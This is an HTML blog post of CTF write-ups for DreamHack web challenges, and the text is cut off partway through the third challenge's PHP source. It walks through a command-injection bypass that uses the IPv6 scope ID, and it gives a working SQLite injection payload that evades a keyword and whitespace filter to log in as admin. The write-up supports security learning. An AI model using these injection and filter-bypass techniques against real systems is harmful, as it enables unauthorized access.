<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>DreamHack Web Part1 | HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="WEBEZ_command_injection Description  ez command injection chall Host: host3.dreamhack.games Port:  11953&#x2F;tcp → 8000&#x2F;tcp For pwnables: nc host3.dreamhack.games 11953 For Web: http:&#x2F;&#x2F;host3.dre">
<meta property="og:type" content="article">
<meta property="og:title" content="DreamHack Web Part1">
<meta property="og:url" content="https://no-flag.com/2024/12/21/Dreamhack_web1/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="WEBEZ_command_injection Description  ez command injection chall Host: host3.dreamhack.games Port:  11953&#x2F;tcp → 8000&#x2F;tcp For pwnables: nc host3.dreamhack.games 11953 For Web: http:&#x2F;&#x2F;host3.dre">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_1.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_2.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_3.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_4.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_5.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_6.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_7.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_8.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_9.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_10.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_11.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_12.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_13.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_14.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_15.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_16.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_17.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_18.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_19.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_20.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_21.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_22.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_23.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_24.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_25.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_26.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_27.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_28.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_29.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_30.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_31.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_32.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_33.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_34.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_35.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_36.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_37.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_38.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_39.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_40.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_41.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_42.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_43.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_44.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_45.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_46.png">
<meta property="og:image" content="https://no-flag.com/img/Dreamhack1_47.png">
<meta property="article:published_time" content="2024-12-21T12:32:07.080Z">
<meta property="article:modified_time" content="2024-04-23T14:29:58.615Z">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://no-flag.com/img/Dreamhack1.png">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-Dreamhack_web1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Dreamhack_web1/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.080Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      DreamHack Web Part1
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EZ-command-injection"><a href="#EZ-command-injection" class="headerlink" title="EZ_command_injection"></a><strong><a target="_blank" rel="noopener" href="https://dreamhack.io/wargame/challenges/1204">EZ_command_injection</a></strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>ez command injection chall</strong></p>
<p><strong>Host: host3.dreamhack.games</strong></p>
<p><strong>Port:  11953&#x2F;tcp → 8000&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 11953</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:11953/">http://host3.dreamhack.games:11953/</a></strong></p>
<p>It give some file which is app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ping&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>():</span><br><span class="line">    host = request.args.get(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        addr = ipaddress.ip_address(host)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        error_msg = <span class="string">&#x27;Invalid IP address&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(error_msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=error_msg)</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">f&#x27;ping -c 3 <span class="subst">&#123;addr&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output([<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd], timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=output.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        error_msg = <span class="string">&#x27;Timeout!!!!&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(error_msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=error_msg)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">        error_msg = <span class="string">&#x27;An error occurred while executing the command&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(error_msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=error_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>You can notice here <code>(&#39;/ping&#39;, methods=[&#39;GET&#39;])</code>, the <code>host</code> parameter is allowed in the ping directory</p>
<p><img src="/img/Dreamhack1.png" alt="Untitled"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://host3.dreamhack.games:<span class="number">23815</span>/ping?host=</span><br></pre></td></tr></table></figure>

<p>If you enter ipaddress you can notice the server output An error occurred while executing the command</p>
<p><img src="/img/Dreamhack1_1.png" alt="Untitled"></p>
<p>If you enter the common command injection payload after the IP</p>
<p><img src="/img/Dreamhack1_2.png" alt="Untitled"></p>
<p>So let’s review the code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addr = ipaddress.ip_address(host)</span><br></pre></td></tr></table></figure>

<p>Maybe we need to find a way around ipaddress restriction</p>
<p>Go search for this part of python parameters</p>
<p><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv6Address">https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv6Address</a></p>
<ul>
<li><em>class</em> ipaddress.<strong>IPv6Address</strong>(<em>address</em>)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Construct an IPv6 address. An [AddressValueError](https://docs.python.org/<span class="number">3</span>/library/ipaddress.html<span class="comment">#ipaddress.AddressValueError) is raised if *address* is not a valid IPv6 address.</span></span><br><span class="line">The following constitutes a valid IPv6 address:</span><br><span class="line"><span class="number">1.</span> A string consisting of eight groups of four hexadecimal digits, each group representing <span class="number">16</span> bits. The groups are separated by colons. This describes an *exploded* (longhand) notation. The string can also be *compressed* (shorthand notation) by various means. See **[RFC <span class="number">4291</span>](https://datatracker.ietf.org/doc/html/rfc4291.html)** <span class="keyword">for</span> details. For example, <span class="string">&quot;0000:0000:0000:0000:0000:0abc:0007:0def&quot;</span> can be compressed to <span class="string">&quot;::abc:7:def&quot;</span>.</span><br><span class="line">Optionally, the string may also have a scope zone ID, expressed <span class="keyword">with</span> a suffix %scope_id. If present, the scope ID must be non-empty, <span class="keyword">and</span> may <span class="keyword">not</span> contain %. See **[RFC <span class="number">4007</span>](https://datatracker.ietf.org/doc/html/rfc4007.html)** <span class="keyword">for</span> details. For example, fe80::<span class="number">1234</span>%<span class="number">1</span> might identify address fe80::<span class="number">1234</span> on the first link of the node.</span><br><span class="line"><span class="number">2.</span> An integer that fits into <span class="number">128</span> bits.</span><br><span class="line"><span class="number">3.</span> An integer packed into a [<span class="built_in">bytes</span>](https://docs.python.org/<span class="number">3</span>/library/stdtypes.html<span class="comment">#bytes) object of length 16, big-endian.&gt;&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">**&gt;&gt;&gt; ipaddress.IPv6Address(<span class="string">&#x27;2001:db8::1000&#x27;</span>)</span><br><span class="line">IPv6Address(<span class="string">&#x27;2001:db8::1000&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ipaddress.IPv6Address(<span class="string">&#x27;ff02::5678%1&#x27;</span>)</span><br><span class="line">IPv6Address(<span class="string">&#x27;ff02::5678%1&#x27;</span>)**</span><br></pre></td></tr></table></figure>

<p>I noticed something about the scope ID of IPV6</p>
<p>what <code>%scope_id</code> Let’s dig into this part</p>
<p><strong>IPv6 connectivity must first be considered within its own scope.</strong><br>This is why this parameter is needed</p>
<p>The link local addresses of all network cards in the world are on the same <strong>fe80::&#x2F;16</strong> network segment! , but they may not necessarily be able to ping each other. This is a big difference from IPv4.</p>
<p>All link-local addresses of IPv6 are in the same network segment, and IP routing alone is not enough to allow them to communicate with each other.</p>
<p>IPv6 addresses have strict scope restrictions. Two addresses must first be restricted within their own scopes, and then routing connectivity is considered.</p>
<p>The following %enp0s9 is required, it specifies the dimension of a link! Otherwise, without this dimension restriction, the next bottom layer of the <code>ping6</code> command will be addressed according to the longest prefix matching rule for global addresses. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ping6 fe80::ebad:<span class="number">9145</span>:fe66:55cc%enp0s9</span><br><span class="line"></span><br><span class="line">fe80::<span class="number">1</span>:<span class="number">2</span>:<span class="number">3</span>:<span class="number">4</span>%eth0</span><br><span class="line">fe80::<span class="number">1</span>:<span class="number">2</span>:<span class="number">3</span>:<span class="number">4</span>%<span class="number">9</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If we use this method, add scope_id after the IPV6 and execute the command injection command, we may be able to get what we want.</p>
<p><img src="/img/Dreamhack1_3.png" alt="Untitled"></p>
<hr>
<hr>
<h3 id="baby-sqlite"><a href="#baby-sqlite" class="headerlink" title="baby-sqlite"></a><strong>baby-sqlite</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>로그인 서비스입니다.<br>SQL INJECTION 취약점을 통해 플래그를 획득하세요!해당 문제는 숙련된 웹해커를 위한 문제입니다.</strong></p>
<p><strong>Host: host3.dreamhack.games</strong></p>
<p><strong>Port:  23313&#x2F;tcp → 8001&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 23313</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:23313/">http://host3.dreamhack.games:23313/</a></strong></p>
<p>this question only give a one file ⇒ app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, make_response, redirect, url_for, session, g</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">32</span>)</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> _app_ctx_stack</span><br><span class="line"></span><br><span class="line">DATABASE = <span class="string">&#x27;users.db&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db</span>():</span><br><span class="line">    top = _app_ctx_stack.top</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(top, <span class="string">&#x27;sqlite_db&#x27;</span>):</span><br><span class="line">        top.sqlite_db = sqlite3.connect(DATABASE)</span><br><span class="line">    <span class="keyword">return</span> top.sqlite_db</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    FLAG = <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    FLAG = <span class="string">&#x27;[**FLAG**]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    uid = request.form.get(<span class="string">&#x27;uid&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">    upw = request.form.get(<span class="string">&#x27;upw&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">    level = request.form.get(<span class="string">&#x27;level&#x27;</span>, <span class="string">&#x27;9&#x27;</span>).lower()</span><br><span class="line"></span><br><span class="line">    **sqli_filter = [<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\x08&#x27;</span>, <span class="string">&#x27;\x09&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x0b&#x27;</span>, <span class="string">&#x27;\x0d&#x27;</span>, <span class="string">&#x27; &#x27;</span>]**</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> sqli_filter:</span><br><span class="line">        <span class="keyword">if</span> uid.find(x) != -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> upw.find(x) != -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> level.find(x) != -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack!&#x27;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        conn = get_db()</span><br><span class="line">        query = <span class="string">f&quot;SELECT uid FROM users WHERE uid=&#x27;<span class="subst">&#123;uid&#125;</span>&#x27; and upw=&#x27;<span class="subst">&#123;upw&#125;</span>&#x27; and level=<span class="subst">&#123;level&#125;</span>;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = conn.execute(query)</span><br><span class="line">            result = req.fetchone()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                uid = result[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> uid == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                    <span class="keyword">return</span> FLAG</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close_connection</span>(<span class="params">exception</span>):</span><br><span class="line">    top = _app_ctx_stack.top</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(top, <span class="string">&#x27;sqlite_db&#x27;</span>):</span><br><span class="line">        top.sqlite_db.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.system(<span class="string">&#x27;rm -rf %s&#x27;</span> % DATABASE)</span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        conn = get_db()</span><br><span class="line">        conn.execute(<span class="string">&#x27;CREATE TABLE users (uid text, upw text, level integer);&#x27;</span>)</span><br><span class="line">        conn.execute(<span class="string">&quot;INSERT INTO users VALUES (&#x27;dream&#x27;,&#x27;cometrue&#x27;, 9);&quot;</span>)</span><br><span class="line">        conn.commit()</span><br><span class="line"></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8001</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Enter the login page. If you directly enter the SQL syntax, No Hack will be output.</p>
<p><img src="/img/Dreamhack1_4.png" alt="Untitled"></p>
<p>You can notice that uid, upw, and level are written in the program. Only level can be used, and the other two are filtered. </p>
<p>Both uid and upw values are converted to lowercase letters using the lower() method. This conversion operation is to unify the user input into lowercase letters to ensure that there will be no problems due to case in subsequent SQL queries.</p>
<p>Therefore, even if the uid and upw entered by the user contain uppercase letters, they will be converted to lowercase letters before subsequent processing, thus preventing the possibility of bypassing verification through case confusion in SQL injection attacks.</p>
<p>But!</p>
<p>The value of level is set to ‘9’.lower(). This means that even if the user does not provide a value for level, or provides an invalid value, the program will set level to ‘9’ and then convert it to lowercase letters. </p>
<p>The purpose of this setting may be to ensure that the value of level is always a valid number.</p>
<p>However, this also means that even if the user does not provide a value for level, no error will be raised. </p>
<p>And even if a non-numeric value is supplied, it will be treated as ‘9’. Such a design may increase security risks in some cases because it makes it easier for attackers to operate at the level of .</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">uid = request.form.get(<span class="string">&#x27;uid&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">upw = request.form.get(<span class="string">&#x27;upw&#x27;</span>, <span class="string">&#x27;&#x27;</span>).lower()</span><br><span class="line">level = request.form.get(<span class="string">&#x27;level&#x27;</span>, <span class="string">&#x27;9&#x27;</span>).lower()</span><br></pre></td></tr></table></figure>

<p>Notice that SQL has filtered content that cannot be included when inputting. You need to find a way to bypass it.</p>
<p>User inputs cannot contain any form of whitespaces, including spaces, tabs, and new lines.</p>
<p>but whitespaces can be supplied by using comments (&#x2F;**&#x2F;)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">**sqli_filter = [<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\x08&#x27;</span>, <span class="string">&#x27;\x09&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;\x0b&#x27;</span>, <span class="string">&#x27;\x0d&#x27;</span>, <span class="string">&#x27; &#x27;</span>]**</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>It need to use admin to login then get the Flag, But admin filtered</p>
<p>SO maybe using SQLite’s built-in function char() and concat operator (||)</p>
<p>And then using UNION replace select</p>
<p>If u go to see the official documentation</p>
<p><a target="_blank" rel="noopener" href="https://www.sqlite.org/syntax/compound-select-stmt.html">https://www.sqlite.org/syntax/compound-select-stmt.html</a></p>
<p>compound-select-stmt refers to the compound query statement in SQL. In SQL, a compound query statement combines multiple SELECT statements and uses specific keywords to indicate how to combine the results of these queries.</p>
<p>Note here that the UNION statement should be followed by select-core</p>
<p><img src="/img/Dreamhack1_5.png" alt="Untitled"></p>
<p>let see select-core</p>
<p><a target="_blank" rel="noopener" href="https://www.sqlite.org/syntax/select-core.html">https://www.sqlite.org/syntax/select-core.html</a></p>
<p>Fortunately, in addition to select, you can also select values</p>
<p><img src="/img/Dreamhack1_6.png" alt="Untitled"></p>
<p>Finally build the exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">9/**/union/**/values(char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e))</span><br></pre></td></tr></table></figure>

<p> <strong>char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e)</strong>  is a method used to construct a string in SQL. The char() function is used to return the ASCII code corresponding character of.</p>
<ul>
<li>char(0x61) is the hexadecimal value 0x61, and the corresponding decimal value is 97, which represents the lowercase letter ‘a’</li>
<li>char(0x64) is the decimal value 100, which represents The corresponding ASCII code of the lowercase letter ‘d’</li>
<li>char(0x6d) is decimal 109, which represents the lowercase letter ‘m’</li>
<li>char(0x69) is decimal 105, which represents the lowercase letter ‘i’</li>
<li>char(0x6e) The corresponding ASCII code is decimal 110, which represents the lowercase letter ‘n’.</li>
</ul>
<p><img src="/img/Dreamhack1_7.png" alt="Untitled"></p>
<hr>
<h3 id="php7cmp4re"><a href="#php7cmp4re" class="headerlink" title="php7cmp4re"></a><strong>php7cmp4re</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>php 7.4로 작성된 페이지입니다.</strong></p>
<p><strong>알맞은 Input 값을 입력하고 플래그를 획득하세요.</strong></p>
<p><strong>플래그 형식은 <code>DH&#123;&#125;</code> 입니다.</strong></p>
<ul>
<li><strong>Servers</strong></li>
</ul>
<p><strong>host: host3.dreamhack.games</strong></p>
<p><strong>Port:  23760&#x2F;tcp → 8000&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 23760</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:23760/">http://host3.dreamhack.games:23760/</a></strong></p>
<p>This question it give 3 file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;php7cmp4re&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- Fixed navbar --&gt;</span><br><span class="line">    &lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span> <span class="title">navbar</span>-<span class="title">fixed</span>-<span class="title">top</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">php7cmp4re</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">navbar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">Index</span> <span class="title">page</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;&lt;!--/.<span class="title">nav</span>-<span class="title">collapse</span> --&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span 